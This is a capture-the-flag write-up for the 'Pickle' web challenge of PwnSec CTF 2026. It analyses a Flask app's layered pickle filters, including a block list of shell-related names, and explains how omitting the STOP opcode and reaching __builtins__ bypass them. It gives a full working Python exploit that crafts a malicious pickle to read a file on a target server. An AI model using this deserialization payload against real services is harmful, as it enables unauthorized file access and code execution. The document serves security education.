# PwnSec CTF 2026 — Pickle (Web, Easy, 226 pts)

> **Author:** P0uZ_Gh0sT  
> **Category:** Web  
> **Difficulty:** Easy  
> **Solves:** 23  
> **First Blood:** JordanSec  
> **Flag:** `pwnsec{6a12c7c6e9f7c96e}`

---

## 📋 Table of Contents

- [Challenge Overview](#challenge-overview)
- [Source Code Analysis](#source-code-analysis)
  - [webapp.py — Main Application](#webappy--main-application)
  - [sessionstore.py — Whitelisted Module](#sessionstorepy--whitelisted-module)
  - [Security Layers](#security-layers)
- [Vulnerability Analysis](#vulnerability-analysis)
  - [Layer 1: BANNED_PATTERNS — The Impossible Filter?](#layer-1-banned_patterns--the-impossible-filter)
  - [Layer 2: REDUCE Disassembly Check](#layer-2-reduce-disassembly-check)
  - [Layer 3: RestrictedUnpickler](#layer-3-restrictedunpickler)
- [Exploitation Strategy](#exploitation-strategy)
  - [Key Insight: Remove the STOP Opcode](#key-insight-remove-the-stop-opcode)
  - [Accessing Built-in Functions](#accessing-built-in-functions)
  - [The Capsule + Render Trick](#the-capsule--render-trick)
  - [Building the Filename](#building-the-filename)
  - [Final Chain](#final-chain)
- [Exploit Code](#exploit-code)
- [Result](#result)

---

## Challenge Overview

We're given a Flask web application called **"Time Capsule"** that accepts a base64-encoded Python pickle payload, validates it through multiple security layers, and then deserializes it using a restricted unpickler.

The goal is to read the flag at `/app/flag.txt`.

```
POST /restore
Content-Type: application/json

{"payload": "<base64-encoded pickle>"}
```

---

## Source Code Analysis

### webapp.py — Main Application

```python
import base64, os, io, pickle, pickletools
from flask import Flask, jsonify, render_template, request
import sessionstore  # noqa: F401

BANNED_PATTERNS = [
    b".", b"os", b"system", b"popen", b"subprocess", b"commands",
    b"exec", b"eval", b"import", b"getattr", b"setattr", b"flag"
]
BANNED_INSTRUCTION = "REDUCE"
ALLOWED_MODULES = {"sessionstore", "collections"}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module.split(".")[0] not in ALLOWED_MODULES:
            raise pickle.UnpicklingError("module %r is not allowed" % module)
        return super().find_class(module, name)

def check(data):
    for pattern in BANNED_PATTERNS:
        if pattern in data:
            raise ValueError("Payload contains banned characters!")
    out = io.StringIO()
    try:
        pickletools.dis(data, out=out)
        disassembled = out.getvalue()
        if BANNED_INSTRUCTION in disassembled:
            raise ValueError("Payload contains banned instruction: %s" % BANNED_INSTRUCTION)
    except Exception:
        disassembled = "Error!"
    return disassembled

def restore(raw_b64):
    import contextlib
    data = base64.b64decode(raw_b64)
    disassembled = check(data)
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        try:
            RestrictedUnpickler(io.BytesIO(data)).load()
        except Exception:
            pass
    return buf.getvalue(), disassembled
```

### sessionstore.py — Whitelisted Module

```python
class Capsule:
    def __init__(self, owner="guest"):
        self.owner = owner
        self.cache = {}

    def __repr__(self):
        return "<Capsule owner=%r fields=%s>" % (self.owner, list(self.cache))

def render(record, key):
    return record.cache[key]

def new_capsule(owner="guest"):
    return Capsule(owner)
```

### Security Layers

The application implements **3 layers** of defense:

| # | Layer | Mechanism |
|---|-------|-----------|
| 1 | `BANNED_PATTERNS` | Raw byte substring check — blocks `b"."`, `b"os"`, `b"flag"`, etc. |
| 2 | `BANNED_INSTRUCTION` | Disassembly check — blocks `REDUCE` opcode in `pickletools.dis()` output |
| 3 | `RestrictedUnpickler` | Module whitelist — only `sessionstore` and `collections` allowed |

---

## Vulnerability Analysis

### Layer 1: BANNED_PATTERNS — The Impossible Filter?

The first thing that stands out is `b"."` in the banned patterns list. In pickle, **every valid pickle stream must end with the STOP opcode**, which is exactly `b"."` (`0x2e`).

```
STOP = b"."  # opcode 0x2e — terminates pickle deserialization
```

This means no valid pickle can pass the `check()` function... or can it?

Looking at the error handling in `restore()`:

```python
with contextlib.redirect_stdout(buf):
    try:
        RestrictedUnpickler(io.BytesIO(data)).load()
    except Exception:
        pass  # <— Exception is silently swallowed!
```

**If we omit the STOP opcode**, the pickle VM will process all our opcodes, execute their side effects, and then crash with `EOFError` when it tries to read the next opcode. This exception is caught and ignored — but **any `print()` calls have already written to stdout**, which is captured by `redirect_stdout`.

### Layer 2: REDUCE Disassembly Check

The `REDUCE` opcode (`R`, `0x52`) is the standard way to call functions in pickle. It's checked via:

```python
try:
    pickletools.dis(data, out=out)
    disassembled = out.getvalue()
    if BANNED_INSTRUCTION in disassembled:  # "REDUCE"
        raise ValueError(...)
except Exception:
    disassembled = "Error!"   # <— Falls through here!
```

Without the STOP opcode, `pickletools.dis()` will **raise an exception** when it reaches EOF. The `except` branch catches it and sets `disassembled = "Error!"` — **completely skipping the REDUCE check**.

### Layer 3: RestrictedUnpickler

```python
ALLOWED_MODULES = {"sessionstore", "collections"}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module.split(".")[0] not in ALLOWED_MODULES:
            raise pickle.UnpicklingError(...)
        return super().find_class(module, name)
```

Only `sessionstore` and `collections` modules are allowed. We can't directly import `builtins`, `os`, or any other module.

However, `find_class(module, name)` internally calls `getattr(sys.modules[module], name)`. This means we can access **any attribute** of the allowed modules, including `__builtins__`!

---

## Exploitation Strategy

### Key Insight: Remove the STOP Opcode

By crafting a pickle stream **without the STOP opcode** (`0x2e`), we simultaneously bypass:

1. ✅ `b"."` in `BANNED_PATTERNS` — byte `0x2e` simply doesn't exist in our payload
2. ✅ `REDUCE` disassembly check — `pickletools.dis()` crashes, check is skipped
3. ✅ Side effects still execute — `print()` output is captured before the crash

```
Normal pickle:   [opcodes...] + STOP(0x2e)  →  clean exit
Our pickle:      [opcodes...]               →  EOFError (caught by except:pass)
```

### Accessing Built-in Functions

In Python 3, every non-`__main__` module has `__builtins__` attribute set to `builtins.__dict__`. Since `sessionstore` is imported by `webapp.py`, we can access it:

```
GLOBAL "sessionstore" "__builtins__"
→ getattr(sessionstore, "__builtins__")
→ builtins.__dict__   (a dict containing open, print, list, bytes, ...)
```

This passes `RestrictedUnpickler` because `"sessionstore"` is in `ALLOWED_MODULES`. ✅

### The Capsule + Render Trick

Now we have the builtins dict, but how do we extract functions from it? We can't use `dict["key"]` directly in pickle.

Enter the `render()` function from `sessionstore`:

```python
def render(record, key):
    return record.cache[key]   # <— dict lookup!
```

If we create a `Capsule` object and **overwrite its `cache` attribute** with the builtins dict using the `BUILD` opcode, then:

```python
render(capsule, "open")
= capsule.cache["open"]
= builtins.__dict__["open"]
= <built-in function open>    # 🎯
```

The `BUILD` opcode calls `obj.__dict__.update(state)`, allowing us to set `capsule.cache = builtins_dict`:

```
GLOBAL "sessionstore" "Capsule"  →  Capsule class
EMPTY_TUPLE + REDUCE             →  Capsule() instance
EMPTY_DICT                       →  {}
  SHORT_BINUNICODE "cache"       →  "cache"
  BINGET 0                       →  builtins_dict (from memo)
  SETITEM                        →  {"cache": builtins_dict}
BUILD                            →  capsule.cache = builtins_dict
```

### Building the Filename

We need to open `flag.txt`, but both `b"flag"` and `b"."` are banned as raw byte substrings.

**Solution:** Build the filename at runtime using `bytes([int, int, ...])`:

```python
bytes([102, 108, 97, 103, 46, 116, 120, 116])
#       f    l    a    g    .    t    x    t
# = b"flag.txt"
```

In the pickle bytecode, each integer is encoded with its own opcode prefix (`K` for `BININT1`), so `"flag"` never appears as contiguous bytes:

```
K\x66  K\x6c  K\x61  K\x67  ...
 ^^^^   ^^^^   ^^^^   ^^^^
 Each int separated by 0x4b prefix → "flag" pattern broken!
```

For the `.` character (byte value 46), we can't use `BININT1` because `K\x2e` contains `0x2e`. Instead, we use the `INT` opcode which encodes the number as ASCII text:

```
INT opcode: I46\n  →  bytes: 0x49 0x34 0x36 0x0a  →  no 0x2e! ✅
```

### Final Chain

```
print(list(open(b"flag.txt")))
```

Using chained `REDUCE` calls:

```
Stack:   print → list → open → path
         ─────   ────   ────   ────
Step 1:  TUPLE1 + REDUCE  →  file = open(path)
Step 2:  TUPLE1 + REDUCE  →  lines = list(file)
Step 3:  TUPLE1 + REDUCE  →  print(lines)  →  stdout captured!
```

---

## Exploit Code

```python
#!/usr/bin/env python3
"""Exploit for PwnSec CTF 2026 — pickle challenge"""

import base64, sys, json

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


def craft_payload():
    p = b""
    p += b"\x80\x02"                              # PROTO 2

    # Phase 1: Get builtins dict
    p += b"csessionstore\n__builtins__\n"          # GLOBAL
    p += b"q\x00"                                  # BINPUT 0 (memo)
    p += b"0"                                      # POP

    # Phase 2: Capsule with cache = builtins_dict
    p += b"csessionstore\nCapsule\n"               # GLOBAL
    p += b")"                                      # EMPTY_TUPLE
    p += b"R"                                      # REDUCE → Capsule()
    p += b"}"                                      # EMPTY_DICT
    p += b"\x8c\x05cache"                          # SHORT_BINUNICODE "cache"
    p += b"h\x00"                                  # BINGET 0
    p += b"s"                                      # SETITEM
    p += b"b"                                      # BUILD
    p += b"q\x01"                                  # BINPUT 1
    p += b"0"                                      # POP

    # Phase 3: Get render function
    p += b"csessionstore\nrender\n"                # GLOBAL
    p += b"q\x02"                                  # BINPUT 2
    p += b"0"                                      # POP

    # Phase 4: Extract builtins via render(capsule, key)
    for idx, name in [(3, "bytes"), (4, "open"), (5, "list"), (6, "print")]:
        p += b"h\x02h\x01"                         # render, capsule
        p += bytes([0x8c, len(name)]) + name.encode()
        p += b"\x86R"                              # TUPLE2 + REDUCE
        p += bytes([0x71, idx])                    # BINPUT idx
        p += b"0"                                  # POP

    # Phase 5: Build b"flag.txt" via bytes([...])
    p += b"h\x03"                                  # bytes constructor
    p += b"]("                                     # EMPTY_LIST + MARK
    for c in b"flag.txt":
        if c == 0x2e:                              # '.' → use INT opcode
            p += b"I46\n"
        else:
            p += bytes([0x4b, c])                  # BININT1
    p += b"e"                                      # APPENDS
    p += b"\x85R"                                  # TUPLE1 + REDUCE
    p += b"q\x07"                                  # BINPUT 7
    p += b"0"                                      # POP

    # Phase 6: print(list(open(path)))
    p += b"h\x06h\x05h\x04h\x07"                  # print, list, open, path
    p += b"\x85R" * 3                              # 3x (TUPLE1 + REDUCE)

    # NO STOP opcode — intentional!
    return p


def main():
    payload = craft_payload()
    b64 = base64.b64encode(payload).decode()

    # Verify no banned patterns
    BANNED = [b".", b"os", b"system", b"popen", b"subprocess",
              b"commands", b"exec", b"eval", b"import",
              b"getattr", b"setattr", b"flag"]
    for pat in BANNED:
        assert pat not in payload, f"Banned pattern {pat!r} found!"
    print("[+] Payload clean — all checks passed")
    print(f"[+] Base64: {b64}\n")

    if len(sys.argv) > 1:
        url = sys.argv[1].rstrip("/")
        r = requests.post(f"{url}/restore", json={"payload": b64}, timeout=15)
        d = r.json()
        print(json.dumps(d, indent=2))
        if d.get("ok"):
            print(f"\n🏁 FLAG: {d['output'].strip()}")
    else:
        print(f"Usage: python3 exploit.py http://<target>:9999")


if __name__ == "__main__":
    main()
```

---

## Result

```
$ python3 exploit.py https://7e08a50baea8f705.chal.ctf.ae

[+] Payload clean — all checks passed
[+] Base64: gAJjc2Vzc2lvbnN0b3JlCl9fYnVpbH...

{
  "disassembled": "Error!",
  "ok": true,
  "output": "['pwnsec{6a12c7c6e9f7c96e}\\n']\n"
}

🏁 FLAG: ['pwnsec{6a12c7c6e9f7c96e}\n']
```

**`pwnsec{6a12c7c6e9f7c96e}`** 🎉

---

## Key Takeaways

1. **Pickle's STOP opcode is just a byte** — if your filter bans `b"."` (`0x2e`), you've accidentally banned the STOP opcode. But removing STOP doesn't prevent side effects from executing.

2. **`except: pass` is dangerous** — silently swallowing exceptions after `pickle.load()` means any side effects (file reads, prints, network calls) persist even when deserialization "fails."

3. **`__builtins__` is everywhere** — every Python module has `__builtins__` as an attribute. Whitelisting a module in a restricted unpickler doesn't just expose its public API — it exposes `builtins.__dict__` too.

4. **Byte-level filters are fragile** — checking `b"flag" in data` can be bypassed by constructing the string at runtime using integer byte values, concatenation, or encoding tricks.

---

*Writeup by kevin — PwnSec CTF 2026*
